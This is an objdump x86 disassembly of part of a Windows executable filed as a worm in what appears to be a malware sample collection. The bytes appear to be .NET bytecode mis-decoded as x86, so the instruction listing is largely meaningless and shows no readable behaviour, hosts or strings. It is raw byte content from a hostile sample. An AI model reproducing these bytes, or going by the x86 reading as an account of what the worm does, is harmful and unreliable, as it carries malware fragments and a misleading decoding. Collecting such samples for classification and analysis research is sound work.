
malware_samples/worm/bff21e43283307fe6ee3823eda7938deeddd4612eee94eeaffc2f993d4eca741.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	50                   	push   %eax
  402001:	3b 01                	cmp    (%ecx),%eax
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 3c 5a 00       	add    $0x5a3c00,%eax
  402013:	00 dc                	add    %bl,%ah
  402015:	e0 00                	loopne 0x402017
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 26                	add    %ah,(%esi)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	18 00                	sbb    %al,(%eax)
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1a                	sub    (%edx),%bl
  402059:	72 01                	jb     0x40205c
  40205b:	00 00                	add    %al,(%eax)
  40205d:	70 2a                	jo     0x402089
  40205f:	1a 20                	sbb    (%eax),%ah
  402061:	be 11 96 05 2a       	mov    $0x2a059611,%esi
  402066:	1e                   	push   %ds
  402067:	02 28                	add    (%eax),%ch
  402069:	19 00                	sbb    %eax,(%eax)
  40206b:	00 0a                	add    %cl,(%edx)
  40206d:	2a 1a                	sub    (%edx),%bl
  40206f:	72 27                	jb     0x402098
  402071:	00 00                	add    %al,(%eax)
  402073:	70 2a                	jo     0x40209f
  402075:	1a 20                	sbb    (%eax),%ah
  402077:	d7                   	xlat   %ds:(%ebx)
  402078:	dd 19                	fstpl  (%ecx)
  40207a:	03 2a                	add    (%edx),%ebp
  40207c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40207d:	73 1a                	jae    0x402099
  40207f:	00 00                	add    %al,(%eax)
  402081:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  402087:	73 1b                	jae    0x4020a4
  402089:	00 00                	add    %al,(%eax)
  40208b:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  402091:	73 1c                	jae    0x4020af
  402093:	00 00                	add    %al,(%eax)
  402095:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  40209b:	73 1d                	jae    0x4020ba
  40209d:	00 00                	add    %al,(%eax)
  40209f:	0a 80 04 00 00 04    	or     0x4000004(%eax),%al
  4020a5:	2a 1a                	sub    (%edx),%bl
  4020a7:	72 4d                	jb     0x4020f6
  4020a9:	00 00                	add    %al,(%eax)
  4020ab:	70 2a                	jo     0x4020d7
  4020ad:	1a 20                	sbb    (%eax),%ah
  4020af:	45                   	inc    %ebp
  4020b0:	2f                   	das
  4020b1:	8d 02                	lea    (%edx),%eax
  4020b3:	2a 1a                	sub    (%edx),%bl
  4020b5:	72 73                	jb     0x40212a
  4020b7:	00 00                	add    %al,(%eax)
  4020b9:	70 2a                	jo     0x4020e5
  4020bb:	1a 20                	sbb    (%eax),%ah
  4020bd:	20 e4                	and    %ah,%ah
  4020bf:	4d                   	dec    %ebp
  4020c0:	04 2a                	add    $0x2a,%al
  4020c2:	1a 72 99             	sbb    -0x67(%edx),%dh
  4020c5:	00 00                	add    %al,(%eax)
  4020c7:	70 2a                	jo     0x4020f3
  4020c9:	1a 20                	sbb    (%eax),%ah
  4020cb:	c6                   	(bad)
  4020cc:	28 54 04 2a          	sub    %dl,0x2a(%esp,%eax,1)
  4020d0:	1a 72 bf             	sbb    -0x41(%edx),%dh
  4020d3:	00 00                	add    %al,(%eax)
  4020d5:	70 2a                	jo     0x402101
  4020d7:	1a 20                	sbb    (%eax),%ah
  4020d9:	8a 1a                	mov    (%edx),%bl
  4020db:	bc 04 2a 1a 72       	mov    $0x721a2a04,%esp
  4020e0:	e5 00                	in     $0x0,%eax
  4020e2:	00 70 2a             	add    %dh,0x2a(%eax)
  4020e5:	1a 20                	sbb    (%eax),%ah
  4020e7:	e1 e7                	loope  0x4020d0
  4020e9:	65 05 2a 1e 02 28    	gs add $0x28021e2a,%eax
  4020ef:	28 00                	sub    %al,(%eax)
  4020f1:	00 0a                	add    %cl,(%edx)
  4020f3:	2a 1a                	sub    (%edx),%bl
  4020f5:	72 75                	jb     0x40216c
  4020f7:	02 00                	add    (%eax),%al
  4020f9:	70 2a                	jo     0x402125
  4020fb:	1a 20                	sbb    (%eax),%ah
  4020fd:	ce                   	into
  4020fe:	09 f0                	or     %esi,%eax
  402100:	01 2a                	add    %ebp,(%edx)
  402102:	1a 72 9b             	sbb    -0x65(%edx),%dh
  402105:	02 00                	add    (%eax),%al
  402107:	70 2a                	jo     0x402133
  402109:	1a 20                	sbb    (%eax),%ah
  40210b:	fe                   	(bad)
  40210c:	5d                   	pop    %ebp
  40210d:	ae                   	scas   %es:(%edi),%al
  40210e:	00 2a                	add    %ch,(%edx)
  402110:	22 28                	and    (%eax),%ch
  402112:	ad                   	lods   %ds:(%esi),%eax
  402113:	00 00                	add    %al,(%eax)
  402115:	06                   	push   %es
  402116:	2b 00                	sub    (%eax),%eax
  402118:	2a 26                	sub    (%esi),%ah
  40211a:	28 00                	sub    %al,(%eax)
  40211c:	01 00                	add    %eax,(%eax)
  40211e:	06                   	push   %es
  40211f:	26 2b 00             	sub    %es:(%eax),%eax
  402122:	2a ee                	sub    %dh,%ch
  402124:	2b 35 73 40 00 00    	sub    0x4073,%esi
  40212a:	0a 20                	or     (%eax),%ah
  40212c:	b8 0b 00 00 20       	mov    $0x2000000b,%eax
  402131:	10 27                	adc    %ah,(%edi)
  402133:	00 00                	add    %al,(%eax)
  402135:	6f                   	outsl  %ds:(%esi),(%dx)
  402136:	41                   	inc    %ecx
  402137:	00 00                	add    %al,(%eax)
  402139:	0a 28                	or     (%eax),%ch
  40213b:	2c 00                	sub    $0x0,%al
  40213d:	00 0a                	add    %cl,(%edx)
  40213f:	7e 10                	jle    0x402151
  402141:	00 00                	add    %al,(%eax)
  402143:	04 2d                	add    $0x2d,%al
  402145:	0a 28                	or     (%eax),%ch
  402147:	47                   	inc    %edi
  402148:	00 00                	add    %al,(%eax)
  40214a:	06                   	push   %es
  40214b:	28 39                	sub    %bh,(%ecx)
  40214d:	00 00                	add    %al,(%eax)
  40214f:	06                   	push   %es
  402150:	7e 16                	jle    0x402168
  402152:	00 00                	add    %al,(%eax)
  402154:	04 6f                	add    $0x6f,%al
  402156:	42                   	inc    %edx
  402157:	00 00                	add    %al,(%eax)
  402159:	0a 26                	or     (%esi),%ah
  40215b:	17                   	pop    %ss
  40215c:	2d c8 2a 1a 72       	sub    $0x721a2ac8,%eax
  402161:	d1 03                	roll   $1,(%ebx)
  402163:	00 70 2a             	add    %dh,0x2a(%eax)
  402166:	1a 20                	sbb    (%eax),%ah
  402168:	f0 df bf 01 2a 1a 72 	lock fistpll 0x721a2a01(%edi)
  40216f:	f7 03 00 70 2a 1a    	testl  $0x1a2a7000,(%ebx)
  402175:	20 f2                	and    %dh,%dl
  402177:	96                   	xchg   %eax,%esi
  402178:	20 02                	and    %al,(%edx)
  40217a:	2a 1a                	sub    (%edx),%bl
  40217c:	72 1d                	jb     0x40219b
  40217e:	04 00                	add    $0x0,%al
  402180:	70 2a                	jo     0x4021ac
  402182:	1a 20                	sbb    (%eax),%ah
  402184:	c0 17 bb             	rclb   $0xbb,(%edi)
  402187:	04 2a                	add    $0x2a,%al
  402189:	1a 72 43             	sbb    0x43(%edx),%dh
  40218c:	04 00                	add    $0x0,%al
  40218e:	70 2a                	jo     0x4021ba
  402190:	1a 20                	sbb    (%eax),%ah
  402192:	94                   	xchg   %eax,%esp
  402193:	79 34                	jns    0x4021c9
  402195:	02 2a                	add    (%edx),%ch
  402197:	1a 72 69             	sbb    0x69(%edx),%dh
  40219a:	04 00                	add    $0x0,%al
  40219c:	70 2a                	jo     0x4021c8
  40219e:	1a 20                	sbb    (%eax),%ah
  4021a0:	53                   	push   %ebx
  4021a1:	08 dd                	or     %bl,%ch
  4021a3:	04 2a                	add    $0x2a,%al
  4021a5:	1a 72 8f             	sbb    -0x71(%edx),%dh
  4021a8:	04 00                	add    $0x0,%al
  4021aa:	70 2a                	jo     0x4021d6
  4021ac:	1a 20                	sbb    (%eax),%ah
  4021ae:	27                   	daa
  4021af:	5e                   	pop    %esi
  4021b0:	e3 03                	jecxz  0x4021b5
  4021b2:	2a c6                	sub    %dh,%al
  4021b4:	16                   	push   %ss
  4021b5:	80 10 00             	adcb   $0x0,(%eax)
  4021b8:	00 04 14             	add    %al,(%esp,%edx,1)
  4021bb:	80 11 00             	adcb   $0x0,(%ecx)
  4021be:	00 04 16             	add    %al,(%esi,%edx,1)
  4021c1:	6a 80                	push   $0xffffff80
  4021c3:	12 00                	adc    (%eax),%al
  4021c5:	00 04 14             	add    %al,(%esp,%edx,1)
  4021c8:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  4021cc:	04 14                	add    $0x14,%al
  4021ce:	80 15 00 00 04 16 73 	adcb   $0x73,0x16040000
  4021d5:	43                   	inc    %ebx
  4021d6:	00 00                	add    %al,(%eax)
  4021d8:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  4021de:	14 80                	adc    $0x80,%al
  4021e0:	17                   	pop    %ss
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	04 2a                	add    $0x2a,%al
  4021e5:	22 28                	and    (%eax),%ch
  4021e7:	49                   	dec    %ecx
  4021e8:	00 00                	add    %al,(%eax)
  4021ea:	06                   	push   %es
  4021eb:	2b 00                	sub    (%eax),%eax
  4021ed:	2a 3a                	sub    (%edx),%bh
  4021ef:	02 74 08 00          	add    0x0(%eax,%ecx,1),%dh
  4021f3:	00 1b                	add    %bl,(%ebx)
  4021f5:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4021f9:	06                   	push   %es
  4021fa:	2b 00                	sub    (%eax),%eax
  4021fc:	2a 1a                	sub    (%edx),%bl
  4021fe:	72 bd                	jb     0x4021bd
  402200:	06                   	push   %es
  402201:	00 70 2a             	add    %dh,0x2a(%eax)
  402204:	1a 72 e3             	sbb    -0x1d(%edx),%dh
  402207:	06                   	push   %es
  402208:	00 70 2a             	add    %dh,0x2a(%eax)
  40220b:	1a 20                	sbb    (%eax),%ah
  40220d:	04 88                	add    $0x88,%al
  40220f:	13 04 2a             	adc    (%edx,%ebp,1),%eax
  402212:	1a 72 09             	sbb    0x9(%edx),%dh
  402215:	07                   	pop    %es
  402216:	00 70 2a             	add    %dh,0x2a(%eax)
  402219:	1a 20                	sbb    (%eax),%ah
  40221b:	8d 98 98 04 2a 1a    	lea    0x1a2a0498(%eax),%ebx
  402221:	72 2f                	jb     0x402252
  402223:	07                   	pop    %es
  402224:	00 70 2a             	add    %dh,0x2a(%eax)
  402227:	1a 20                	sbb    (%eax),%ah
  402229:	96                   	xchg   %eax,%esi
  40222a:	fe                   	(bad)
  40222b:	12 01                	adc    (%ecx),%al
  40222d:	2a 1a                	sub    (%edx),%bl
  40222f:	72 55                	jb     0x402286
  402231:	07                   	pop    %es
  402232:	00 70 2a             	add    %dh,0x2a(%eax)
  402235:	1a 20                	sbb    (%eax),%ah
  402237:	1a 78 21             	sbb    0x21(%eax),%bh
  40223a:	05 2a 1a 72 7b       	add    $0x7b721a2a,%eax
  40223f:	07                   	pop    %es
  402240:	00 70 2a             	add    %dh,0x2a(%eax)
  402243:	1a 72 a1             	sbb    -0x5f(%edx),%dh
  402246:	07                   	pop    %es
  402247:	00 70 2a             	add    %dh,0x2a(%eax)
  40224a:	1a 20                	sbb    (%eax),%ah
  40224c:	b7 4f                	mov    $0x4f,%bh
  40224e:	04 02                	add    $0x2,%al
  402250:	2a 1a                	sub    (%edx),%bl
  402252:	72 c7                	jb     0x40221b
  402254:	07                   	pop    %es
  402255:	00 70 2a             	add    %dh,0x2a(%eax)
  402258:	1a 20                	sbb    (%eax),%ah
  40225a:	bc 1e 08 02 2a       	mov    $0x2a02081e,%esp
  40225f:	1a 72 84             	sbb    -0x7c(%edx),%dh
  402262:	08 00                	or     %al,(%eax)
  402264:	70 2a                	jo     0x402290
  402266:	1a 72 41             	sbb    0x41(%edx),%dh
  402269:	09 00                	or     %eax,(%eax)
  40226b:	70 2a                	jo     0x402297
  40226d:	1a 72 fe             	sbb    -0x2(%edx),%dh
  402270:	09 00                	or     %eax,(%eax)
  402272:	70 2a                	jo     0x40229e
  402274:	1a 72 bb             	sbb    -0x45(%edx),%dh
  402277:	0a 00                	or     (%eax),%al
  402279:	70 2a                	jo     0x4022a5
  40227b:	1a 72 78             	sbb    0x78(%edx),%dh
  40227e:	0b 00                	or     (%eax),%eax
  402280:	70 2a                	jo     0x4022ac
  402282:	1a 20                	sbb    (%eax),%ah
  402284:	89 66 bd             	mov    %esp,-0x43(%esi)
  402287:	03 2a                	add    (%edx),%ebp
  402289:	1a 72 35             	sbb    0x35(%edx),%dh
  40228c:	0c 00                	or     $0x0,%al
  40228e:	70 2a                	jo     0x4022ba
  402290:	1a 20                	sbb    (%eax),%ah
  402292:	11 6e d5             	adc    %ebp,-0x2b(%esi)
  402295:	02 2a                	add    (%edx),%ch
  402297:	1a 72 f2             	sbb    -0xe(%edx),%dh
  40229a:	0c 00                	or     $0x0,%al
  40229c:	70 2a                	jo     0x4022c8
  40229e:	1a 20                	sbb    (%eax),%ah
  4022a0:	7e bf                	jle    0x402261
  4022a2:	48                   	dec    %eax
  4022a3:	02 2a                	add    (%edx),%ch
  4022a5:	1a 72 af             	sbb    -0x51(%edx),%dh
  4022a8:	0d 00 70 2a 1a       	or     $0x1a2a7000,%eax
  4022ad:	20 ef                	and    %ch,%bh
  4022af:	34 2e                	xor    $0x2e,%al
  4022b1:	02 2a                	add    (%edx),%ch
  4022b3:	1a 72 6c             	sbb    0x6c(%edx),%dh
  4022b6:	0e                   	push   %cs
  4022b7:	00 70 2a             	add    %dh,0x2a(%eax)
  4022ba:	1a 72 29             	sbb    0x29(%edx),%dh
  4022bd:	0f 00                	(bad)
  4022bf:	70 2a                	jo     0x4022eb
  4022c1:	1a 20                	sbb    (%eax),%ah
  4022c3:	ad                   	lods   %ds:(%esi),%eax
  4022c4:	26 ae                	es scas %es:(%edi),%al
  4022c6:	05 2a 1a 72 e6       	add    $0xe6721a2a,%eax
  4022cb:	0f 00                	(bad)
  4022cd:	70 2a                	jo     0x4022f9
  4022cf:	1a 72 a3             	sbb    -0x5d(%edx),%dh
  4022d2:	10 00                	adc    %al,(%eax)
  4022d4:	70 2a                	jo     0x402300
  4022d6:	1a 20                	sbb    (%eax),%ah
  4022d8:	ee                   	out    %al,(%dx)
  4022d9:	ad                   	lods   %ds:(%esi),%eax
  4022da:	3c 03                	cmp    $0x3,%al
  4022dc:	2a 1a                	sub    (%edx),%bl
  4022de:	72 60                	jb     0x402340
  4022e0:	11 00                	adc    %eax,(%eax)
  4022e2:	70 2a                	jo     0x40230e
  4022e4:	1a 20                	sbb    (%eax),%ah
  4022e6:	84 99 d6 01 2a 3a    	test   %bl,0x3a2a01d6(%ecx)
  4022ec:	02 28                	add    (%eax),%ch
  4022ee:	2d 00 00 0a 28       	sub    $0x280a0000,%eax
  4022f3:	7b 00                	jnp    0x4022f5
  4022f5:	00 06                	add    %al,(%esi)
  4022f7:	2b 00                	sub    (%eax),%eax
  4022f9:	2a 3a                	sub    (%edx),%bh
  4022fb:	02 28                	add    (%eax),%ch
  4022fd:	2d 00 00 0a 28       	sub    $0x280a0000,%eax
  402302:	7c 00                	jl     0x402304
  402304:	00 06                	add    %al,(%esi)
  402306:	2b 00                	sub    (%eax),%eax
  402308:	2a 1a                	sub    (%edx),%bl
  40230a:	72 2b                	jb     0x402337
  40230c:	16                   	push   %ss
  40230d:	00 70 2a             	add    %dh,0x2a(%eax)
  402310:	1a 20                	sbb    (%eax),%ah
  402312:	e4 f6                	in     $0xf6,%al
  402314:	ae                   	scas   %es:(%edi),%al
  402315:	00 2a                	add    %ch,(%edx)
  402317:	1a 72 e8             	sbb    -0x18(%edx),%dh
  40231a:	16                   	push   %ss
  40231b:	00 70 2a             	add    %dh,0x2a(%eax)
  40231e:	1a 72 a5             	sbb    -0x5b(%edx),%dh
  402321:	17                   	pop    %ss
  402322:	00 70 2a             	add    %dh,0x2a(%eax)
  402325:	1a 72 62             	sbb    0x62(%edx),%dh
  402328:	18 00                	sbb    %al,(%eax)
  40232a:	70 2a                	jo     0x402356
  40232c:	1a 20                	sbb    (%eax),%ah
  40232e:	25 6b 55 00 2a       	and    $0x2a00556b,%eax
  402333:	1a 72 1f             	sbb    0x1f(%edx),%dh
  402336:	19 00                	sbb    %eax,(%eax)
  402338:	70 2a                	jo     0x402364
  40233a:	1a 20                	sbb    (%eax),%ah
  40233c:	cc                   	int3
  40233d:	ca a2 04             	lret   $0x4a2
  402340:	2a 1a                	sub    (%edx),%bl
  402342:	72 dc                	jb     0x402320
  402344:	19 00                	sbb    %eax,(%eax)
  402346:	70 2a                	jo     0x402372
  402348:	1a 72 99             	sbb    -0x67(%edx),%dh
  40234b:	1a 00                	sbb    (%eax),%al
  40234d:	70 2a                	jo     0x402379
  40234f:	1a 72 56             	sbb    0x56(%edx),%dh
  402352:	1b 00                	sbb    (%eax),%eax
  402354:	70 2a                	jo     0x402380
  402356:	1a 72 13             	sbb    0x13(%edx),%dh
  402359:	1c 00                	sbb    $0x0,%al
  40235b:	70 2a                	jo     0x402387
  40235d:	1a 20                	sbb    (%eax),%ah
  40235f:	1d 54 97 01 2a       	sbb    $0x2a019754,%eax
  402364:	1a 72 d0             	sbb    -0x30(%edx),%dh
  402367:	1c 00                	sbb    $0x0,%al
  402369:	70 2a                	jo     0x402395
  40236b:	1a 20                	sbb    (%eax),%ah
  40236d:	55                   	push   %ebp
  40236e:	6f                   	outsl  %ds:(%esi),(%dx)
  40236f:	e3 02                	jecxz  0x402373
  402371:	2a 1a                	sub    (%edx),%bl
  402373:	72 8d                	jb     0x402302
  402375:	1d 00 70 2a 1a       	sbb    $0x1a2a7000,%eax
  40237a:	20 2d ca 0f 03 2a    	and    %ch,0x2a030fca
  402380:	1a 72 4a             	sbb    0x4a(%edx),%dh
  402383:	1e                   	push   %ds
  402384:	00 70 2a             	add    %dh,0x2a(%eax)
  402387:	1a 72 07             	sbb    0x7(%edx),%dh
  40238a:	1f                   	pop    %ds
  40238b:	00 70 2a             	add    %dh,0x2a(%eax)
  40238e:	1a 20                	sbb    (%eax),%ah
  402390:	b0 38                	mov    $0x38,%al
  402392:	46                   	inc    %esi
  402393:	03 2a                	add    (%edx),%ebp
  402395:	1a 72 c4             	sbb    -0x3c(%edx),%dh
  402398:	1f                   	pop    %ds
  402399:	00 70 2a             	add    %dh,0x2a(%eax)
  40239c:	1a 72 81             	sbb    -0x7f(%edx),%dh
  40239f:	20 00                	and    %al,(%eax)
  4023a1:	70 2a                	jo     0x4023cd
  4023a3:	1a 20                	sbb    (%eax),%ah
  4023a5:	83 8e 4c 02 2a 1a 72 	orl    $0x72,0x1a2a024c(%esi)
  4023ac:	42                   	inc    %edx
  4023ad:	22 00                	and    (%eax),%al
  4023af:	70 2a                	jo     0x4023db
  4023b1:	1a 20                	sbb    (%eax),%ah
  4023b3:	1f                   	pop    %ds
  4023b4:	ed                   	in     (%dx),%eax
  4023b5:	b5 00                	mov    $0x0,%ch
  4023b7:	2a 1a                	sub    (%edx),%bl
  4023b9:	72 8a                	jb     0x402345
  4023bb:	22 00                	and    (%eax),%al
  4023bd:	70 2a                	jo     0x4023e9
  4023bf:	1a 20                	sbb    (%eax),%ah
  4023c1:	cb                   	lret
  4023c2:	f7 57 04             	notl   0x4(%edi)
  4023c5:	2a 8e 14 fe 06 af    	sub    -0x50f901ec(%esi),%cl
  4023cb:	00 00                	add    %al,(%eax)
  4023cd:	06                   	push   %es
  4023ce:	73 e1                	jae    0x4023b1
  4023d0:	00 00                	add    %al,(%eax)
  4023d2:	06                   	push   %es
  4023d3:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  4023d7:	04 7e                	add    $0x7e,%al
  4023d9:	ef                   	out    %eax,(%dx)
  4023da:	00 00                	add    %al,(%eax)
  4023dc:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4023e2:	1f                   	pop    %ds
  4023e3:	0d 80 26 00 00       	or     $0x2680,%eax
  4023e8:	04 2a                	add    $0x2a,%al
  4023ea:	56                   	push   %esi
  4023eb:	7e 24                	jle    0x402411
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	04 28                	add    $0x28,%al
  4023f1:	ae                   	scas   %es:(%edi),%al
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	06                   	push   %es
  4023f5:	80 25 00 00 04 28 f0 	andb   $0xf0,0x28040000
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	0a 2a                	or     (%edx),%ch
  402400:	1a 72 96             	sbb    -0x6a(%edx),%dh
  402403:	24 00                	and    $0x0,%al
  402405:	70 2a                	jo     0x402431
  402407:	1a 20                	sbb    (%eax),%ah
  402409:	1f                   	pop    %ds
  40240a:	83 65 05 2a          	andl   $0x2a,0x5(%ebp)
  40240e:	1a 72 de             	sbb    -0x22(%edx),%dh
  402411:	24 00                	and    $0x0,%al
  402413:	70 2a                	jo     0x40243f
  402415:	1a 20                	sbb    (%eax),%ah
  402417:	1c 29                	sbb    $0x29,%al
  402419:	aa                   	stos   %al,%es:(%edi)
  40241a:	01 2a                	add    %ebp,(%edx)
  40241c:	1a 72 26             	sbb    0x26(%edx),%dh
  40241f:	25 00 70 2a 1a       	and    $0x1a2a7000,%eax
  402424:	72 6e                	jb     0x402494
  402426:	25 00 70 2a 1a       	and    $0x1a2a7000,%eax
  40242b:	20 2a                	and    %ch,(%edx)
  40242d:	70 7b                	jo     0x4024aa
  40242f:	01 2a                	add    %ebp,(%edx)
  402431:	1a 72 b6             	sbb    -0x4a(%edx),%dh
  402434:	25 00 70 2a 1a       	and    $0x1a2a7000,%eax
  402439:	72 fe                	jb     0x402439
  40243b:	25 00 70 2a 1a       	and    $0x1a2a7000,%eax
  402440:	72 46                	jb     0x402488
  402442:	26 00 70 2a          	add    %dh,%es:0x2a(%eax)
  402446:	1a 20                	sbb    (%eax),%ah
  402448:	ae                   	scas   %es:(%edi),%al
  402449:	48                   	dec    %eax
  40244a:	9e                   	sahf
  40244b:	05 2a 1a 72 8e       	add    $0x8e721a2a,%eax
  402450:	26 00 70 2a          	add    %dh,%es:0x2a(%eax)
  402454:	1a 72 d6             	sbb    -0x2a(%edx),%dh
  402457:	26 00 70 2a          	add    %dh,%es:0x2a(%eax)
  40245b:	1a 72 1e             	sbb    0x1e(%edx),%dh
  40245e:	27                   	daa
  40245f:	00 70 2a             	add    %dh,0x2a(%eax)
  402462:	1a 72 66             	sbb    0x66(%edx),%dh
  402465:	27                   	daa
  402466:	00 70 2a             	add    %dh,0x2a(%eax)
  402469:	1a 72 ae             	sbb    -0x52(%edx),%dh
  40246c:	27                   	daa
  40246d:	00 70 2a             	add    %dh,0x2a(%eax)
  402470:	1a 20                	sbb    (%eax),%ah
  402472:	02 13                	add    (%ebx),%dl
  402474:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402475:	05 2a 1a 72 f6       	add    $0xf6721a2a,%eax
  40247a:	27                   	daa
  40247b:	00 70 2a             	add    %dh,0x2a(%eax)
  40247e:	1a 20                	sbb    (%eax),%ah
  402480:	5d                   	pop    %ebp
  402481:	a1 e8 05 2a 1a       	mov    0x1a2a05e8,%eax
  402486:	72 3e                	jb     0x4024c6
  402488:	28 00                	sub    %al,(%eax)
  40248a:	70 2a                	jo     0x4024b6
  40248c:	1a 20                	sbb    (%eax),%ah
  40248e:	31 32                	xor    %esi,(%edx)
  402490:	0d 05 2a 1a 72       	or     $0x721a2a05,%eax
  402495:	86 28                	xchg   %ch,(%eax)
  402497:	00 70 2a             	add    %dh,0x2a(%eax)
  40249a:	1a 72 ce             	sbb    -0x32(%edx),%dh
  40249d:	28 00                	sub    %al,(%eax)
  40249f:	70 2a                	jo     0x4024cb
  4024a1:	1a 72 16             	sbb    0x16(%edx),%dh
  4024a4:	29 00                	sub    %eax,(%eax)
  4024a6:	70 2a                	jo     0x4024d2
  4024a8:	1a 20                	sbb    (%eax),%ah
  4024aa:	1f                   	pop    %ds
  4024ab:	47                   	inc    %edi
  4024ac:	25 05 2a 1a 72       	and    $0x721a2a05,%eax
  4024b1:	5e                   	pop    %esi
  4024b2:	29 00                	sub    %eax,(%eax)
  4024b4:	70 2a                	jo     0x4024e0
  4024b6:	1a 28                	sbb    (%eax),%ch
  4024b8:	e9 00 00 06 2a       	jmp    0x2a4624bd
  4024bd:	1a 72 a6             	sbb    -0x5a(%edx),%dh
  4024c0:	29 00                	sub    %eax,(%eax)
  4024c2:	70 2a                	jo     0x4024ee
  4024c4:	1a 20                	sbb    (%eax),%ah
  4024c6:	e5 08                	in     $0x8,%eax
  4024c8:	89 03                	mov    %eax,(%ebx)
  4024ca:	2a 1a                	sub    (%edx),%bl
  4024cc:	72 ee                	jb     0x4024bc
  4024ce:	29 00                	sub    %eax,(%eax)
  4024d0:	70 2a                	jo     0x4024fc
  4024d2:	1a 72 36             	sbb    0x36(%edx),%dh
  4024d5:	2a 00                	sub    (%eax),%al
  4024d7:	70 2a                	jo     0x402503
  4024d9:	1a 20                	sbb    (%eax),%ah
  4024db:	ed                   	in     (%dx),%eax
  4024dc:	38 cb                	cmp    %cl,%bl
  4024de:	04 2a                	add    $0x2a,%al
  4024e0:	1a 72 7e             	sbb    0x7e(%edx),%dh
  4024e3:	2a 00                	sub    (%eax),%al
  4024e5:	70 2a                	jo     0x402511
  4024e7:	1a 20                	sbb    (%eax),%ah
  4024e9:	1f                   	pop    %ds
  4024ea:	28 4e 00             	sub    %cl,0x0(%esi)
  4024ed:	2a 1a                	sub    (%edx),%bl
  4024ef:	72 c6                	jb     0x4024b7
  4024f1:	2a 00                	sub    (%eax),%al
  4024f3:	70 2a                	jo     0x40251f
  4024f5:	1a 20                	sbb    (%eax),%ah
  4024f7:	6c                   	insb   (%dx),%es:(%edi)
  4024f8:	d7                   	xlat   %ds:(%ebx)
  4024f9:	3e 00 2a             	add    %ch,%ds:(%edx)
  4024fc:	1a 72 0e             	sbb    0xe(%edx),%dh
  4024ff:	2b 00                	sub    (%eax),%eax
  402501:	70 2a                	jo     0x40252d
  402503:	1a 20                	sbb    (%eax),%ah
  402505:	0c 9f                	or     $0x9f,%al
  402507:	d1 02                	roll   $1,(%edx)
  402509:	2a 1a                	sub    (%edx),%bl
  40250b:	72 56                	jb     0x402563
  40250d:	2b 00                	sub    (%eax),%eax
  40250f:	70 2a                	jo     0x40253b
  402511:	62 7e 32             	bound  %edi,0x32(%esi)
  402514:	00 00                	add    %al,(%eax)
  402516:	04 2c                	add    $0x2c,%al
  402518:	10 7e 32             	adc    %bh,0x32(%esi)
  40251b:	00 00                	add    %al,(%eax)
  40251d:	04 6f                	add    $0x6f,%al
  40251f:	29 01                	sub    %eax,(%ecx)
  402521:	00 0a                	add    %cl,(%edx)
  402523:	14 80                	adc    $0x80,%al
  402525:	32 00                	xor    (%eax),%al
  402527:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40252a:	1a 72 cd             	sbb    -0x33(%edx),%dh
  40252d:	2e 00 70 2a          	add    %dh,%cs:0x2a(%eax)
  402531:	1a 20                	sbb    (%eax),%ah
  402533:	48                   	dec    %eax
  402534:	fb                   	sti
  402535:	83 05 2a 1a 72 15 2f 	addl   $0x2f,0x15721a2a
  40253c:	00 70 2a             	add    %dh,0x2a(%eax)
  40253f:	1a 72 5d             	sbb    0x5d(%edx),%dh
  402542:	2f                   	das
  402543:	00 70 2a             	add    %dh,0x2a(%eax)
  402546:	1a 20                	sbb    (%eax),%ah
  402548:	fd                   	std
  402549:	60                   	pusha
  40254a:	33 00                	xor    (%eax),%eax
  40254c:	2a 1a                	sub    (%edx),%bl
  40254e:	72 a5                	jb     0x4024f5
  402550:	2f                   	das
  402551:	00 70 2a             	add    %dh,0x2a(%eax)
  402554:	1a 20                	sbb    (%eax),%ah
  402556:	49                   	dec    %ecx
  402557:	5b                   	pop    %ebx
  402558:	83 05 2a 1a 72 ed 2f 	addl   $0x2f,0xed721a2a
  40255f:	00 70 2a             	add    %dh,0x2a(%eax)
  402562:	1a 20                	sbb    (%eax),%ah
  402564:	80 7c b4 04 2a       	cmpb   $0x2a,0x4(%esp,%esi,4)
  402569:	1a 72 35             	sbb    0x35(%edx),%dh
  40256c:	30 00                	xor    %al,(%eax)
  40256e:	70 2a                	jo     0x40259a
  402570:	1a 20                	sbb    (%eax),%ah
  402572:	27                   	daa
  402573:	be 19 04 2a 1a       	mov    $0x1a2a0419,%esi
  402578:	72 7d                	jb     0x4025f7
  40257a:	30 00                	xor    %al,(%eax)
  40257c:	70 2a                	jo     0x4025a8
  40257e:	1a 20                	sbb    (%eax),%ah
  402580:	9f                   	lahf
  402581:	0e                   	push   %cs
  402582:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402583:	04 2a                	add    $0x2a,%al
  402585:	1a 72 c5             	sbb    -0x3b(%edx),%dh
  402588:	30 00                	xor    %al,(%eax)
  40258a:	70 2a                	jo     0x4025b6
  40258c:	1a 20                	sbb    (%eax),%ah
  40258e:	68 cf 3a 01 2a       	push   $0x2a013acf
  402593:	1a 72 0d             	sbb    0xd(%edx),%dh
  402596:	31 00                	xor    %eax,(%eax)
  402598:	70 2a                	jo     0x4025c4
  40259a:	1a 20                	sbb    (%eax),%ah
  40259c:	bb f4 cc 00 2a       	mov    $0x2a00ccf4,%ebx
  4025a1:	1a 72 55             	sbb    0x55(%edx),%dh
